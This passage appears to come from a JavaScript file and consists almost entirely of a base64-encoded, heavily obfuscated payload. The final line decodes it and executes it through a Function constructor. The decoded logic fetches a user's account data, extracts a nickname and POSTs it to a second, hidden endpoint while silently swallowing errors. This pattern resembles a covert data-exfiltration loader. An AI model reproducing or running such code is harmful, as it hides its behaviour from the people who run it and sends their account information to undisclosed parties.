MHgxXSl7Yk1UUl84bC5wdXNoKChWendZVEdufHBLU0NZQ2c8PFZUSmV2ZmwpJllvVl95cVsweDNdKX1yZXR1cm4galRfWGRpUihiTVRSXzhsKX1mdW5jdGlvbiBkTk1uemVTKGNISFJoWil7aWYodHlwZW9mIHNnQUdaQVtjSEhSaFpdPT09WW9WX3lxWzB4NV0pe3JldHVybiBzZ0FHWkFbY0hIUmhaXT12ZVEzdFYobFN2eFptNltjSEhSaFpdKX1yZXR1cm4gc2dBR1pBW2NISFJoWl19aTdBUkVYKHNnQUdaQT17fSxsU3Z4Wm02PVsidENpaiV4bE57eix4RkBqc2cxaEp3VHJOcHs+UCpwSEhlIVZhaVpgRSIsImAzYWsvPEM4S3FUWkUiLCJLQiNZakJwenhZMSFpQChhWWRwI2pCXjlKdUhmQkNhYSIsIl1LX1lCZmYlOVlAIiwibjVTd3wlI05oRzhiRkB4JnJBaXdOP1s1I3IlMlgxTVFuIV5LS0BoIiwiRjFKUD4wZDszbzxGPURxej5laWc0QSxhUXUzMH5wVE4/XCIwNCIsIlQqVD9xQFk+M2x5VDldWVdeMyNKO145XCJrdW91eGdwU2Y/aWo2Z1QlOVk0MTZRQiFXam1RTVBoIiwiQDE/WXFzM05KR3g/LzA7dndZUWtWJFhlK2xyUEU3SmElQGw7Vnl5Sn1ZUyIsIldsRlFHcGxOKGlyMTpwLHNIWVtBRkY4ZU1xfl1ERl5cIjVIKEwxQV1OMnoiLCJBdXZWVzspO0ZHQD0+RnYmPzFzZ3hzaTRWQ28wPFNsLEo1XSNTRHsmPn1ReHMwMCYodXlKLERkeEsiLCIuXlI7Wi8mTig9QyhsbX5Xfl5nWTd1Lj5DdUBpUTl9WyIsIj5zRTtpcEAoUnpfY1dwKltGSFpBKm9FLFMoQn1VR35cIi5DMSIsIk5PZSopO1p5PnI2RmNDZnlhRSIsIldZRVk0KSRXbX0/JktHSW0lVmNVMClTWyN6IiwiMjZOO1oyTVouTUpDLCp8TlBkLGcvXn1Kb01kVDREdWFFfUFMTl8uU3E1NHcoe2sqJHk/d21aaCIsIlY+dj9oW0FzZkIub1coWFwifGllMk11QXpfQnFaWEdjaWxGZ3dWIiwiSUNZWntQJCRQdTlKJUtZVjZqZV0iLCJ4VnxGLyt2LEBYJmt6PG1NMUxlaytvNXFpR3d7RSIsImg+Lj9bNnNKaHIqTUUiLCJ0VmMyMlskJFdxQ2U9UShWd0FTUjxkeEIhezI+Tm0sc14jXktEMGp7dHV3WW06IyFEQHlsIiwiPWVkVlZaS0p6QjpiRGB4IyxvOSIsIkkzIUpbV1U4PjY0ZVJLMixBZV9sLG9eenRVKVMhQ15bMVkpI1JZOUpkclZrQDEiLCJPTTgjTTpnen51ZzJqRyR2U2VfRnxkZyhVTWlKPiYhVihpWzJiUFRCfkNWZnJtRFZlalRWIyRlNW8obiIsIkhNSiNlXl14R0dJQT11XSYrd2pnREh8ITAodTR9e0khVCFHUnh4LmVGR1N7cCY6U1dZXjRZdiEsXSIsIiR3fWpdQHRTbj1HO0k8MlFbR3VhSTo5KHNZO19Ee1widm55O1UmPzQsTH19PkVAVFc+KjkiLCJlc0RVJEJge1JvT194JjlKZUAhUjEpOTAxLFwiX0NIXCJwQzptd05XcUF4ezY/ayp3JjtoIiwiQl42al1BMU59bDZQVyoycFBeKkxLZjk4aUIrNjB7OixrNTFdLF4sNE9DVUBMMUlzfk13I1oyVlp3eyIsIntCfV1ZN1wiKH1HdV8+e0pTK2RNYUI+RU50ej5QbGBVLH5DO1VnczB6b152XjxTTnZuZXUyKUgpNDJ1bTNFIiwiTjNHUFQoTDUrcSk/bEA/I3xAakx1Zn01c0JxMGpHQiF7RSIsIlBkX2ovXlgofHF+QTEvN3NKc19ZS2Z7TnUzZD9lR3R2Nz82Rit1ZntfbztjR3VvTnt5OSIsIk0+O1VsOHR3cW9EUDxnVFdKbFcybV5EekJYQH1cImBPJlwiXmtMUFtOQlJHNS8zSyIsIkVvWmFyb24oUFVARjh4QlwiKmVMUVgpaCIsIjhAS0EuWkJOT2kwJi8mfHNcIl5tWVgyZkUiLCJrPnVhLkRpLEZ6KT9cIjBAdnkxdCNjQVs5IiwidllpOzxaP0VXNTcyQkN7UTxIemduL1o+dyhiZkNgcldZaV93aFR0emtpbzA/JipOQ288THAvNT52eyIsIllNbmFTRCE0bkMlMHNwJVEuM3s0USIsIlFlWVZ6W1tTamwsezowQXApeUB3aCgwKEV6fix6PFNzL3dLa2o+QntAbFojViRucHg/UERIJHR6c0JZIiwiWFklWk9ZUlcwLF56XjxjI3dvLylpPHQ4WXFQVWc6Q01vKns0MHhdRWR9PD16XSIsImt6SGtMWUF5VWk4RD1EOnpdKlYyXCI7cixqb3pqUytvViZBOCM6Xkt6a01BQToxIiwiYipWa3dBQzBwcVFzN0d3UyE6eFQwKTxOXXsiLCJTKnVhXCJZKEE3WT59VC8yUXNYfFkoPiE8JSxjfVwiYEVTRUI0WldXYj5CNUxnRSIsIkpHbGpvN3owVWs1Zi4rflYzXjhQTTpnd3U9SlAxMDRwTU1ka1Q3Qyg+dTo9KDx9Sjw/ZkszPkckNCIsIjhDdkZLPklFKjNHZntnc0o3TTdhMHhQWj56KDI+SHd6eWFGd04/O3spKDdVemB4LGRlfkwkdmU+dyIsIjZsLGE8KzhBQHoiLCI8MzlqRytvO1JHc15YKzJRdkhHUEQoVlU7M1VKVy92LHRkcXcqWj00RTVnWE5LIiwiSHcmWTZnQXdfKVFzPiZ8Tk01aUpAOyZhNHsjaV8rUVwiemxbQTZYSEJpbDlqfiY3YiphIWxpUGgiLCJHRzo/TFpDOSIsIlZBb2ojVz9hJkNOU19XMFNvQCNWTHU0RSIsInBAbHQscCNXaVkrKUR7bCIsIlRlSiNAKEd7YXJYMnZwRnZ4XmNdWjA7akRYcV96cE8mLmRgWmxvaiRsXnszaW1fdmVZI1A9RCwsL1laVkUiLCJBZWZGKzpTcVwiTWp4ZUBNc2RNXCJqcTc/ezdvKExYR2BbPjMwVjk8aWF7elYoM1NHIiwiVHN+VXFBJSV3IiwiSmFsd1ovPE53e2F7LDlcIix+PzFhTzs/Tn51VjN2OSIsInxkQkZYdkNTR1g6TEsrXlwiUUdlKXxvd1VcIj1ZJj1EfmJLIWlKI1crezhxKzJGQEVbUkclNCIsIjFGbFFCWCpKbE1lfXxDMlF7R31qUCsuPnlNUmZNK1JpRjV2Vit4OkJTKG8/MTBieVM6ZV0iLCJLT1BdQ0FWNXt6cUIrcEMiLCJFWDJWTkJXPGIoeD9xWH5WZUhwVFgyaCIsInExMDo8eGBORzVkI3tbNXZgP1AqcHk6TkB6WSNHRDRIS1crMl9eXCI1VyxTUSxDPSIsIjh1KVQ+SE94O3VBRXwwLHNFb0JLYlBtPjNYYWlmQ01RQ3kwUGZUM05jWFZnOisyUXp5T2FfQWBFIiwiUHUoKTk8Ok5mNTkvWUh6c3FWeCozKWgiLCJqKm1Kelt7JHcsI1N5Ojp6Y3c6RlkoaCIsIiZlNFl4eG97aG9xVU9wOUhBM2NBdzxHe1dvYXhPUWsiLCJTM3FqaDg3U2NYX1VfUSZONEFjYS9bJmFlLFFzRzlkKm9ZaHciLCJ0Q2phdSh1YS9HMlszU1UsQWQjSmh2YlpKR2BGMS9Ec1BqKjJuOytvajU1KGtdIiwiWXM/WXcpRSZ3a3w8Y0NQJmVIPlRFdk4kNjMsMStDUCxSamFLYiVYPnpZO0sqRkxTOlkvVWIlbDQydU8iLCIzMXRQZC9yKVMzVnh7QGFXWmpTP34/aEpye0RfLnVgISozdzQ4eGk0KnU/V3hTWXNmSERMMnhoIiwie0t5RlYrSVdMcjM9VUc5T3UzbEwjYCtXXSxZQkUiLCJJaWopVlpaZVJsXS9fR0VcImJYKSNKdHpbUlkyQT5DV1N+MzdEL29CV31YaWY1QEtwdzUwI1wiYGgodWk5e0UiLCJUbzp3VnBneksiLCJvQ3F3X1pnd3R6SyEjcDpIfWo3XXdAYlpocikmd0hSIyIsIlhAZDRgalR7bWwpfUUiLCJRQStVaVR9OFJvMFZEYE52YjM1NGErPlomTVJmQzwjITlHeWwiLCJ5SEdQe3gyNH1HQGlePFdIWHMpa0I3OkVdIiwiVk0yKmYrYTRhend7azx+W0RkOTsoczF7Nyw/PU5LIiwiRWEhRnhBRyZSWUB9aDpWXCJMT3I0TllgVy9sIiwidTNdWiVvMDUoXkB4UmBaeXtvVGxCdl00fSw5YF1tdnpPXjlMPDxoIiwiOVlPMi8rZz4vbHtncCZEc31oIiwiMXJhazglXCI+Rn1MM1FDenNZWTJaN3BUNHZ7IyhXKlhXIiwiVzEwUFoyYl9pR2xKOihDeTVFIiwiZDomdHxSVUpVaWRQQFgqTjAjeXcpL3whZFVLeyQvZSMqWVsjSW9sKS9sIiwiMTVQXTFeZTV0KXdKVyhILFheSGsiLCJ1aUtrOTc/TkZZOld2Kl5haH0lVj5CdixnTXIxLCoheVZHTmpTdCg5IiwiJUMjbDxedldUcSZUaEdzW0g6ciMyVGUoUnpYQyVAS3A8dzkiLCI+aVwiO3RETjtsaTMmbVFdTzFyVWx0WyMsOk1KKFgxIiwiez4oaigoYHhMfVwia24xfiFOb0xsW1dldzEiLCJcIip1KW9naCIsInBhLnd6K0Z7MXEoPSsqK3MrQHRaUHhFQjZNKSZYUT12Tmp8RkFwPkpmVXczTm1xXCJNKkJsIiwiL3c3XVQ3MXs8NSlaaDFxYVhANFo/UHE4ZyhWc2lASyNAc1YyJURtW0pyaCRrPE1RfGkkSyIsInJYNVRKJUIhJXFSUHVwQyIsIiEhan1NY3RQZXZicFZye2EyRyIsIkwhdGNxPnJQIiwiZTZUUVEpQiIsInI/di5iWjsyWHZRXVBZWCIsInczfFRWPSx6JmkkK3ReXl0pYiQjaFAlZmNLfE9aLFheQ3NHIiwiQ3N8VGg4Z1oiLCJZYWRZfCIsIktzU2l+NXJLWSIsInpRak1oNSFDRllPP2csVSIsIllEP01meDtZYSVFK18+SXdRYWpNIiwiX2M7YzwiLCI+RzRoQyIsIlJhOCpmeEpqLmo3a25CPnI8WGpNbSIsIkV3cDZsXCI6WiIsImMmfFRJNUgiLCIhcG9UZTlYSVRMMylwLCMuTUEiLCJzc1hAYj9+WnklRStAQiIsInJjISksQG03N1ZJb0giLCJKI1JZKn0ySVRMRVcyPkExPmUuNnJ+MkNhTGgyST0pXm9haVBoOHM9b2slK3p0YGUxc3FALyIsIit3WSN+NUgiLCIhUzpNIiwidzN8VFY9LHo8KU9xWHNgZSFdJWhPQGtmXikwK3E+ci5YOzxoZyNJcThrLFlxc3VXOkdgO3xQXCJbVmthdDUmUnc1d1pANDIxYjpnUyIsInczfFRWPSx6JmlMTzcuc11EVWM1STgyW1lWJk9APyxyKWB+QE43IVswKUIocFp3S3pcIm4yOVBKRGpNRyhyKiRLTCVDN1NEL2ZOYz9OQjx+cnxNVDxTT0MxdUxVdyxDO20oO19KSmVDeHBVdUA7WDdtISVbQlZsZCokLFlJXz5OYl53fjZlcUNDcGt1QEJzQmdgc01KZyIsIm1hSTZJIiwiOjNTaDBAOXFBa1giLCJyYWlNIiwiRlF+QGQ1Z1oiLCJGUX5AMldzWTpnT3F3QiIsIml4KEwzaF8iLCJAeChMM2hIOyJdKTtmdW5jdGlvbiBWeDB2MHZSKCl7dmFyIHNnQUdaQT1bZnVuY3Rpb24oKXtyZXR1cm4gZ2xvYmFsVGhpc30sZnVuY3Rpb24oKXtyZXR1cm4gZ2xvYmFsfSxmdW5jdGlvbigpe3JldHVybiB3aW5kb3d9LGZ1bmN0aW9uKCl7cmV0dXJuIG5ldyBGdW5jdGlvbigicmV0dXJuIHRoaXMiKSgpfV0sbFN2eFptNixjSEhSaFosbV9XNVRQTjtpN0FSRVgobFN2eFptNj12b2lkIDB4MCxjSEhSaFo9W10pO3RyeXtpN0FSRVgobFN2eFptNj1PYmplY3QsY0hIUmhaW1lvVl95cVsweGJdXSgiIi5fX3Byb3RvX18uY29uc3RydWN0b3IubmFtZSkpfWNhdGNoKGJNVFJfOGwpe31VRFZjcUU6Zm9yKG1fVzVUUE49WW9WX3lxWzB4MF07bV9XNVRQTjxzZ0FHWkFbWW9WX3lxWzB4NF1dO21fVzVUUE4rKyl0cnl7dmFyIFZ6d1lUR247bFN2eFptNj1zZ0FHWkFbbV9XNVRQTl0oKTtmb3IoVnp3WVRHbj1Zb1ZfeXFbMHgwXTtWendZVEduPGNISFJoWltZb1ZfeXFbMHg0XV07Vnp3WVRHbisrKWlmKHR5cGVvZiBsU3Z4Wm02W2NISFJoWltWendZVEduXV09PT1Zb1ZfeXFbMHg1XSljb250aW51ZSBVRFZjcUU7cmV0dXJuIGxTdnhabTZ9Y2F0Y2goYk1UUl84bCl7fXJldHVybiBsU3Z4Wm02fHx0aGlzfWk3QVJFWChjSEhSaFo9VngwdjB2UigpfHx7fSxtX1c1VFBOPWNISFJoWi5UZXh0RGVjb2RlcixiTVRSXzhsPWNISFJoWi5VaW50OEFycmF5LFZ6d1lUR249Y0hIUmhaLkJ1ZmZlcixWVEpldmZsPWNISFJoWi5TdHJpbmd8fFN0cmluZyxwS1NDWUNnPWNISFJoWi5BcnJheXx8QXJyYXksTldkVUc5PWZ1bmN0aW9uKCl7dmFyIHNnQUdaQT1uZXcgcEtTQ1lDZygweDgwKSxsU3Z4Wm02LGNISFJoWjtpN0FSRVgobFN2eFptNj1WVEpldmZsW1lvVl95cVsweDhdXXx8VlRKZXZmbC5mcm9tQ2hhckNvZGUsY0hIUmhaPVtdKTtyZXR1cm4gZnVuY3Rpb24obV9XNVRQTil7dmFyIGJNVFJfOGwsVnp3WVRHbixwS1NDWUNnLE5XZFVHOTtpN0FSRVgoVnp3WVRHbj12b2lkIDB4MCxwS1NDWUNnPW1fVzVUUE5bWW9WX3lxWzB4NF1dLGNISFJoWltZb1ZfeXFbMHg0XV09WW9WX3lxWzB4MF0pO2ZvcihOV2RVRzk9WW9WX3lxWzB4MF07TldkVUc5PHBLU0NZQ2c7KXtpN0FSRVgoVnp3WVRHbj1tX1c1VFBOW05XZFVHOSsrXSxWendZVEduPD0weDdmP2JNVFJfOGw9Vnp3WVRHbjpWendZVEduPD0weGRmP2JNVFJfOGw9KFZ6d1lUR24mMHgxZik8PFlvVl95cVsweDddfG1fVzVUUE5bTldkVUc5KytdJllvVl95cVsweDZdOlZ6d1lUR248PTB4ZWY/Yk1UUl84bD0oVnp3WVRHbiYweGYpPDxZb1ZfeXFbMHhhXXwobV9XNVRQTltOV2RVRzkrK10mWW9WX3lxWzB4Nl0pPDxZb1ZfeXFbMHg3XXxtX1c1VFBOW05XZFVHOSsrXSZZb1ZfeXFbMHg2XTpWVEpldmZsW1lvVl95cVsweDhdXT9iTVRSXzhsPShWendZVEduJllvVl95cVsweDldKTw8MHgxMnwobV9XNVRQTltOV2RVRzkrK10mWW9WX3lxWzB4Nl0pPDxZb1ZfeXFbMHhhXXwobV9XNVRQTltOV2RVRzkrK10mWW9WX3lxWzB4Nl0pPDxZb1ZfeXFbMHg3XXxtX1c1VFBOW05XZFVHOSsrXSZZb1ZfeXFbMHg2XTooYk1UUl84bD1Zb1ZfeXFbMHg2XSxOV2RVRzkrPTB4MyksY0hIUmhaW1lvVl95cVsweGJdXShzZ0FHWkFbYk1UUl84bF18fChzZ0FHWkFbYk1UUl84bF09bFN2eFptNihiTVRSXzhsKSkpKX1yZXR1cm4gY0hIUmhaLmpvaW4oIiIpfX0oKSk7ZnVuY3Rpb24galRfWGRpUihzZ0FHWkEpe3JldHVybiB0eXBlb2YgbV9XNVRQTiE9PVlvVl95cVsweDVdJiZtX1c1VFBOP25ldyBtX1c1VFBOKCkuZGVjb2RlKG5ldyBiTVRSXzhsKHNnQUdaQSkpOnR5cGVvZiBWendZVEduIT09WW9WX3lxWzB4NV0mJlZ6d1lUR24/Vnp3WVRHbi5mcm9tKHNnQUdaQSkudG9TdHJpbmcoInV0Zi04Iik6TldkVUc5KHNnQUdaQSl9ZnVuY3Rpb24gdWtJU3ExKGNISFJoWixtX1c1VFBOPVlvVl95cVsweDFdKXtmdW5jdGlvbiBiTVRSXzhsKGNISFJoWil7dmFyIG1fVzVUUE49IkJHUFQ2PHdTV3NlYlgwSSFcIjFFW3RIJUwjfHJmVWsyfVE4N247PW8oYV94P15GakRdJCY6ejkuNS9DM01PWUBOK3ZkbHBpfilgZ1oqLGNxUko+NG1BS3tWdXloIixiTVRSXzhsLFZ6d1lUR24sc2dBR1pBLGxTdnhabTYsVlRKZXZmbCxwS1NDWUNnLE5XZFVHOTtpN0FSRVgoYk1UUl84bD0iIisoY0hIUmhafHwiIiksVnp3WVRHbj1iTVRSXzhsLmxlbmd0aCxzZ0FHWkE9W10sbFN2eFptNj1Zb1ZfeXFbMHgwXSxWVEpldmZsPVlvVl95cVsweDBdLHBLU0NZQ2c9LVlvVl95cVsweDFdKTtmb3IoTldkVUc5PVlvVl95cVsweDBdO05XZFVHOTxWendZVEduO05XZFVHOSsrKXt2YXIgdmVRM3RWPW1fVzVUUE4uaW5kZXhPZihiTVRSXzhsW05XZFVHOV0pO2lmKHZlUTN0Vj09PS1Zb1ZfeXFbMHgxXSljb250aW51ZTtpZihwS1NDWUNnPFlvVl95cVsweDBdKXtwS1NDWUNnPXZlUTN0Vn1lbHNle2k3QVJFWChwS1NDWUNnKz12ZVEzdFYqWW9WX3lxWzB4Y10sbFN2eFptNnw9cEtTQ1lDZzw8VlRKZXZmbCxWVEpldmZsKz0ocEtTQ1lDZyZZb1ZfeXFbMHhkXSk+WW9WX3lxWzB4ZV0/WW9WX3lxWzB4Zl06WW9WX3lxWzB4MTBdKTtkb3tpN0FSRVgoc2dBR1pBLnB1c2gobFN2eFptNiZZb1ZfeXFbMHgzXSksbFN2eFptNj4+PVlvVl95cVsweDJdLFZUSmV2ZmwtPVlvVl95cVsweDJdKX13aGlsZShWVEpldmZsPllvVl95cVsweDldKTtwS1NDWUNnPS1Zb1ZfeXFbMHgxXX19aWYocEtTQ1lDZz4tWW9WX3lxWzB4MV0pe3NnQUdaQS5wdXNoKChsU3Z4Wm02fHBLU0NZQ2c8PFZUSmV2ZmwpJllvVl95cVsweDNdKX1yZXR1cm4galRfWGRpUihzZ0FHWkEpfWZ1bmN0aW9uIFZ6d1lUR24oY0hIUmhaKXtpZih0eXBlb2Ygc2dBR1pBW2NISFJoWl09PT1Zb1ZfeXFbMHg1XSl7cmV0dXJuIHNnQUdaQVtjSEhSaFpdPWJNVFJfOGwobFN2eFptNltjSEhSaFpdKX1yZXR1cm4gc2dBR1pBW2NISFJoWl19T2JqZWN0W1Z6d1lUR24oMHg1OSldKGNISFJoWixWendZVEduKDB4NWEpLHtbVnp3WVRHbihZb1ZfeXFbMHhjXSldOm1fVzVUUE4sW1Z6d1lUR24oMHg1YyldOiEweDF9KTtyZXR1cm4gY0hIUmhafWFzeW5jIGZ1bmN0aW9uIE1ScXA5NCgpe3RyeXtmdW5jdGlvbiBjSEhSaFooY0hIUmhaKXt2YXIgbV9XNVRQTj0iSEFaR0JSSllpTVQvVWZwc15WZ0tMfFdgQ20mPH5kSTZoUGVyMXcuXWJuUWF5b0QqOnROU3EpY2xfM08wWCxFa2olKzR9JFwiNTI7eDcjQDgoPz05PiF6W3Z7dUYiLGJNVFJfOGwsVnp3WVRHbixWVEpldmZsLHBLU0NZQ2csTldkVUc5LHZlUTN0VixkTk1uemVTO2k3QVJFWChiTVRSXzhsPSIiKyhjSEhSaFp8fCIiKSxWendZVEduPWJNVFJfOGwubGVuZ3RoLFZUSmV2Zmw9W10scEtTQ1lDZz1Zb1ZfeXFbMHgwXSxOV2RVRzk9WW9WX3lxWzB4MF0sdmVRM3RWPS1Zb1ZfeXFbMHgxXSk7Zm9yKGROTW56ZVM9WW9WX3lxWzB4MF07ZE5NbnplUzxWendZVEduO2ROTW56ZVMrKyl7dmFyIFZ4MHYwdlI9bV9XNVRQTi5pbmRleE9mKGJNVFJfOGxbZE5NbnplU10pO2lmKFZ4MHYwdlI9PT0tWW9WX3lxWzB4MV0pY29udGludWU7aWYodmVRM3RWPFlvVl95cVsweDBdKXt2ZVEzdFY9VngwdjB2Un1lbHNle2k3QVJFWCh2ZVEzdFYrPVZ4MHYwdlIqWW9WX3lxWzB4Y10scEtTQ1lDZ3w9dmVRM3RWPDxOV2RVRzksTldkVUc5Kz0odmVRM3RWJllvVl95cVsweGRdKT5Zb1ZfeXFbMHhlXT9Zb1ZfeXFbMHhmXTpZb1ZfeXFbMHgxMF0pO2Rve2k3QVJFWChWVEpldmZsLnB1c2gocEtTQ1lDZyZZb1ZfeXFbMHgzXSkscEtTQ1lDZz4+PVlvVl95cVsweDJdLE5XZFVHOS09WW9WX3lxWzB4Ml0pfXdoaWxlKE5XZFVHOT5Zb1ZfeXFbMHg5XSk7dmVRM3RWPS1Zb1ZfeXFbMHgxXX19aWYodmVRM3RWPi1Zb1ZfeXFbMHgxXSl7VlRKZXZmbC5wdXNoKChwS1NDWUNnfHZlUTN0Vjw8TldkVUc5KSZZb1ZfeXFbMHgzXSl9cmV0dXJuIGpUX1hkaVIoVlRKZXZmbCl9ZnVuY3Rpb24gbV9XNVRQTihtX1c1VFBOKXtpZih0eXBlb2Ygc2dBR1pBW21fVzVUUE5dPT09WW9WX3lxWzB4NV0pe3JldHVybiBzZ0FHWkFbbV9XNVRQTl09Y0hIUmhaKGxTdnhabTZbbV9XNVRQTl0pfXJldHVybiBzZ0FHWkFbbV9XNVRQTl19Y29uc3QgYk1UUl84bD1hd2FpdCBmZXRjaChtX1c1VFBOKDB4NWQpLHtbbV9XNVRQTihZb1ZfeXFbMHgxMV0pXTptX1c1VFBOKFlvVl95cVsweDEyXSksW21fVzVUUE4oWW9WX3lxWzB4MTNdKV06e1ttX1c1VFBOKFlvVl95cVsweDE0XSldOm1fVzVUUE4oWW9WX3lxWzB4MTVdKX19KSxWendZVEduPWF3YWl0IGJNVFJfOGxbbV9XNVRQTigweDYzKV0oKSxWVEpldmZsPVZ6d1lUR25bbV9XNVRQTigweDY0KV0/Lm5pY2tuYW1lfHxtX1c1VFBOKDB4NjUpLHBLU0NZQ2c9e1ttX1c1VFBOKDB4NjYpXTpbe1ttX1c1VFBOKDB4NjcpXTptX1c1VFBOKDB4NjgpLFttX1c1VFBOKDB4NjkpXTptX1c1VFBOKDB4NmEpK1ZUSmV2ZmwrbV9XNVRQTigweDZiKStlbmNvZGVVUklDb21wb25lbnQoVlRKZXZmbCkrIikiLFttX1c1VFBOKDB4NmMpXTp7W21fVzVUUE4oMHg2ZCldOm1fVzVUUE4oMHg2ZSl9fV19LE5XZFVHOT1hd2FpdCBmZXRjaChtX1c1VFBOKDB4NmYpLHtbbV9XNVRQTihZb1ZfeXFbMHgxMV0pXTptX1c1VFBOKFlvVl95cVsweDEyXSksW21fVzVUUE4oWW9WX3lxWzB4MTNdKV06e1ttX1c1VFBOKFlvVl95cVsweDE0XSldOm1fVzVUUE4oWW9WX3lxWzB4MTVdKX0sW21fVzVUUE4oMHg3MCldOkpTT05bbV9XNVRQTigweDcxKV0ocEtTQ1lDZyl9KTtjb25zb2xlW21fVzVUUE4oMHg3MildKG1fVzVUUE4oMHg3MykpO2lmKCFOV2RVRzkub2spe3Rocm93IG5ldyBFcnJvcihtX1c1VFBOKDB4NzQpKX19Y2F0Y2godmVRM3RWKXtmdW5jdGlvbiBkTk1uemVTKGNISFJoWil7dmFyIG1fVzVUUE49Il87NHtgdV0jfn0/NSosQ0dlclhtOFBSKzpIQk92Rlp6N2QyVUBecFFNajAzTlwicW9Wd3N4KGFUQVtnbCVEU1d5MSYuJGliIWs2WT5FPEw9S2hKYy9uKTlmSXR8IixiTVRSXzhsLFZ6d1lUR24sVlRKZXZmbCxwS1NDWUNnLE5XZFVHOSx2ZVEzdFYsZE5NbnplUztpN0FSRVgoYk1UUl84bD0iIisoY0hIUmhafHwiIiksVnp3WVRHbj1iTVRSXzhsLmxlbmd0aCxWVEpldmZsPVtdLHBLU0NZQ2c9WW9WX3lxWzB4MF0sTldkVUc5PVlvVl95cVsweDBdLHZlUTN0Vj0tWW9WX3lxWzB4MV0pO2ZvcihkTk1uemVTPVlvVl95cVsweDBdO2ROTW56ZVM8Vnp3WVRHbjtkTk1uemVTKyspe3ZhciBWeDB2MHZSPW1fVzVUUE4uaW5kZXhPZihiTVRSXzhsW2ROTW56ZVNdKTtpZihWeDB2MHZSPT09LVlvVl95cVsweDFdKWNvbnRpbnVlO2lmKHZlUTN0VjxZb1ZfeXFbMHgwXSl7dmVRM3RWPVZ4MHYwdlJ9ZWxzZXtpN0FSRVgodmVRM3RWKz1WeDB2MHZSKllvVl95cVsweGNdLHBLU0NZQ2d8PXZlUTN0Vjw8TldkVUc5LE5XZFVHOSs9KHZlUTN0ViZZb1ZfeXFbMHhkXSk+WW9WX3lxWzB4ZV0/WW9WX3lxWzB4Zl06WW9WX3lxWzB4MTBdKTtkb3tpN0FSRVgoVlRKZXZmbC5wdXNoKHBLU0NZQ2cmWW9WX3lxWzB4M10pLHBLU0NZQ2c+Pj1Zb1ZfeXFbMHgyXSxOV2RVRzktPVlvVl95cVsweDJdKX13aGlsZShOV2RVRzk+WW9WX3lxWzB4OV0pO3ZlUTN0Vj0tWW9WX3lxWzB4MV19fWlmKHZlUTN0Vj4tWW9WX3lxWzB4MV0pe1ZUSmV2ZmwucHVzaCgocEtTQ1lDZ3x2ZVEzdFY8PE5XZFVHOSkmWW9WX3lxWzB4M10pfXJldHVybiBqVF9YZGlSKFZUSmV2ZmwpfWZ1bmN0aW9uIFZ4MHYwdlIoY0hIUmhaKXtpZih0eXBlb2Ygc2dBR1pBW2NISFJoWl09PT1Zb1ZfeXFbMHg1XSl7cmV0dXJuIHNnQUdaQVtjSEhSaFpdPWROTW56ZVMobFN2eFptNltjSEhSaFpdKX1yZXR1cm4gc2dBR1pBW2NISFJoWl19Y29uc29sZVtWeDB2MHZSKDB4NzUpXShWeDB2MHZSKDB4NzYpLHZlUTN0Vil9fWZ1bmN0aW9uIGk3QVJFWCgpe2k3QVJFWD1mdW5jdGlvbigpe319TVJxcDk0KCk7"
    функция.constructor(atob((''+функция).match(/=\s*"((?:[A-Za-z0-9+/=]|\\")+)"/)[1]))();
})()
